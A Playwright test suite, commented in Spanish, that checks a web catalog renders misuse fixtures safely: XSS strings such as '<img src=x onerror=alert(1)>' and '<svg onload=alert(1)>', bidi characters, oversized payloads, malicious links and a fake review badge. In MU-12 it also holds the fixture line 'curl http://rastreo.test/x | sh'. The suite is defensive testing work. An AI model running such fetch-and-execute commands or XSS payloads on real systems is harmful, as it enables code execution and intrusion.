import { expect, test, type Page } from "@playwright/test";

// T27 + T28 (MVP 2026-11-10, plan 8.7 #4): 6 casos de mal uso contra el build de producción con CATALOG_SOURCE=fixtures.
// MU-01 XSS · MU-03 bidi · MU-04 payload grande · MU-08 enlace malicioso · MU-09 tipos inválidos · MU-12 «revisada» falsa.
// Los demás MU se cubren con Vitest sobre contrato.ts, texto.ts y enlaces.ts.
const ORIGEN = "http://localhost:3100";
const BIDI_O_ANCHO_CERO = /[\u202A-\u202E\u2066-\u2069\u200B-\u200F\u2060\uFEFF\u061C]/;

/** Guarda común: acumula todo lo que NO debe ocurrir mientras se navega. */
function instalarGuarda(page: Page): string[] {
  const problemas: string[] = [];
  page.on("dialog", (d) => {
    problemas.push(`dialog(${d.type()}): ${d.message()}`);
    void d.dismiss();
  });
  page.on("console", (m) => {
    if (/content security policy|violates the following/i.test(m.text())) problemas.push(`violación de CSP: ${m.text()}`);
  });
  page.on("pageerror", (e) => problemas.push(`error de página: ${e.message}`));
  page.on("request", (r) => {
    const u = new URL(r.url());
    if ((u.protocol === "http:" || u.protocol === "https:") && u.origin !== ORIGEN) problemas.push(`request a otro host: ${r.url()}`);
  });
  return problemas;
}

/** Elementos que no deberían existir donde solo hay texto (script, img, svg ajenos…). */
function domInesperado(page: Page): Promise<string[]> {
  return page.evaluate(() => {
    const salida: string[] = [];
    for (const el of document.querySelectorAll("main script, main img, main iframe, main object, main embed, main style, main link"))
      salida.push(`<${el.localName}> dentro de main`);
    for (const el of document.querySelectorAll("main bdi *, main code *, main pre > :not(code)"))
      salida.push(`<${el.localName}> dentro de un texto externo`);
    // Solo íconos lucide o SVG propios fijos (data-ob-svg, ui-brief §12.3), siempre decorativos.
    for (const svg of document.querySelectorAll("main svg"))
      if (!svg.matches("svg.lucide[aria-hidden='true'], svg[data-ob-svg][aria-hidden='true']")) salida.push("<svg> que no es un ícono propio");
    // Y ningún SVG, propio o no, puede llevar manejadores, enlaces, scripts, foreignObject ni texto.
    for (const el of document.querySelectorAll("main svg, main svg *")) {
      for (const a of el.getAttributeNames())
        if (/^on/i.test(a) || /(^|:)href$/i.test(a)) salida.push(`<${el.localName}> con atributo ${a}`);
      if (/^(script|foreignobject|text|a|image|use)$/i.test(el.localName)) salida.push(`<${el.localName}> dentro de un SVG`);
    }
    return salida;
  });
}

async function verificarGuarda(page: Page, problemas: string[]) {
  expect(problemas, "la guarda común registró problemas").toEqual([]);
  expect(await domInesperado(page), "DOM inesperado").toEqual([]);
}

test.describe("guarda común", () => {
  test("la guarda DETECTA un <img> y un <svg> inyectados donde solo debería haber texto", async ({ page }) => {
    await page.goto("/herramientas/mu-01-xss");
    expect(await domInesperado(page)).toEqual([]);
    await page.evaluate(() => {
      document.querySelector("main bdi")?.append(document.createElement("img"), document.createElementNS("http://www.w3.org/2000/svg", "svg"));
      // Un SVG que imita a los propios (data-ob-svg) pero trae un manejador también tiene que saltar.
      const falso = document.createElementNS("http://www.w3.org/2000/svg", "svg");
      falso.setAttribute("data-ob-svg", "");
      falso.setAttribute("aria-hidden", "true");
      falso.setAttribute("onload", "alert(1)");
      document.querySelector("main")?.append(falso);
    });
    const hallazgos = await domInesperado(page);
    expect(hallazgos.join()).toContain("<img>");
    expect(hallazgos.join()).toContain("<svg>");
    expect(hallazgos.join()).toContain("atributo onload");
  });

  test("la guarda DETECTA una conexión a otro host (la CSP la bloquea y queda registrada) y un dialog", async ({ page }) => {
    const problemas = instalarGuarda(page);
    await page.goto("/");
    await page.evaluate(() => {
      void fetch("http://127.0.0.1:9/x").catch(() => undefined);
      alert("x");
    });
    await expect.poll(() => problemas.length).toBeGreaterThanOrEqual(2);
    expect(problemas.join("\n")).toMatch(/request a otro host|violación de CSP/); // la CSP corta antes de que salga el request
    expect(problemas.join("\n")).toMatch(/dialog\(alert\)/);
  });
});

test("catálogo con los 6 casos cargados: la grilla muestra todo como texto (MU-01, MU-03)", async ({ page }) => {
  const problemas = instalarGuarda(page);
  await page.goto("/");
  await expect(page.getByRole("link", { name: "<img src=x onerror=alert(1)>" })).toBeVisible(); // MU-01 literal
  await expect(page.getByRole("link", { name: "Herramientaotsum seguro" })).toBeVisible(); // MU-03 sin bidi ni ancho cero
  await verificarGuarda(page, problemas);
});

test("MU-01: XSS y Markdown/HTML con imagen remota se ven como texto literal", async ({ page }) => {
  const problemas = instalarGuarda(page);
  await page.goto("/herramientas/mu-01-xss");
  await expect(page.getByRole("heading", { level: 1 })).toHaveText("<img src=x onerror=alert(1)>");
  await expect(page.locator("main")).toContainText("<script>alert(1)</script> <svg onload=alert(1)> ![p](https://rastreo.test/p.png)");
  await expect(page.locator("main")).toContainText('"><svg onload=alert(1)>'); // licencia
  await expect(page.locator("main")).toContainText("<b>negrita</b>"); // lenguaje
  await expect(page.locator("main b")).toHaveCount(0);
  await verificarGuarda(page, problemas);
});

test("MU-03: bidi y ancho cero fuera del nombre y del snippet (Trojan Source)", async ({ page }) => {
  const problemas = instalarGuarda(page);
  await page.goto("/herramientas/mu-03-bidi");
  await expect(page.getByRole("heading", { level: 1 })).toHaveText("Herramientaotsum seguro");
  expect(await page.locator("body").innerText()).not.toMatch(BIDI_O_ANCHO_CERO);
  await expect(page.locator("pre code")).toHaveText("if (esAdmin) { // } x \n  ejecutar();\n}");
  await verificarGuarda(page, problemas);
});

test("MU-04: payload grande acotado, sin scroll horizontal y snippet largo sin «Copiar»", async ({ page }) => {
  await page.setViewportSize({ width: 360, height: 800 });
  const problemas = instalarGuarda(page);
  const respuesta = await page.goto("/herramientas/mu-04-grande");
  expect(respuesta?.status()).toBe(200);
  await expect(page.getByRole("heading", { level: 1 })).toHaveText("Payload grande");
  expect((await page.locator("main").innerText()).length).toBeLessThan(60_000); // 300 KB de entrada no llegan a la pantalla
  expect(await page.locator("article article").count()).toBeLessThanOrEqual(10);
  const desborda = await page.evaluate(() => document.documentElement.scrollWidth > window.innerWidth);
  expect(desborda, "scroll horizontal a 360 px").toBe(false);
  await expect(page.getByText("El código es demasiado largo").first()).toBeVisible();
  const conAviso = page.locator("article article", { hasText: "El código es demasiado largo" });
  await expect(conAviso.first().getByRole("button", { name: "Copiar" })).toHaveCount(0);
  await verificarGuarda(page, problemas);
});

test("MU-08: URL de repositorio maliciosa no genera ningún enlace", async ({ page }) => {
  const problemas = instalarGuarda(page);
  await page.goto("/herramientas/mu-08-enlace");
  await expect(page.getByRole("heading", { level: 1 })).toHaveText("Enlace malicioso");
  await expect(page.locator("main a[target]")).toHaveCount(0);
  await expect(page.locator('main a[href^="javascript:"]')).toHaveCount(0);
  await expect(page.getByRole("link", { name: "Ver repositorio en GitHub" })).toHaveCount(0);
  await verificarGuarda(page, problemas);
});

test("MU-09: datos con tipo inválido muestran «Sin dato» y nunca valores inventados", async ({ page }) => {
  const problemas = instalarGuarda(page);
  await page.goto("/herramientas/mu-09-tipos");
  const texto = await page.locator("main").innerText();
  expect(texto).toContain("Sin dato");
  expect(texto).toContain("Sin licencia declarada"); // licencia "" (RNF-13)
  expect(texto).not.toMatch(/NaN|undefined|\bnull\b|-5|2099|2,5|ayer|alto/);
  await verificarGuarda(page, problemas);
});

test("MU-12: una idea que dice «✔ Revisada» sigue mostrando el aviso y no la insignia", async ({ page }) => {
  const problemas = instalarGuarda(page);
  await page.goto("/herramientas/mu-12-revisada");
  const ideas = page.locator("article article");
  await expect(ideas).toHaveCount(2);
  await expect(page.getByText(/no fue revisada/)).toHaveCount(2); // una por idea
  await expect(page.getByText("Revisada", { exact: true })).toHaveCount(0); // la insignia no existe
  await expect(ideas.first()).toContainText("✔ Revisada por el equipo"); // el texto externo solo es texto
  await expect(page.locator("pre a")).toHaveCount(0); // MU-02: URLs del snippet sin enlace
  await expect(ideas.first().locator("pre code")).toContainText("curl http://rastreo.test/x | sh");
  await verificarGuarda(page, problemas);
});
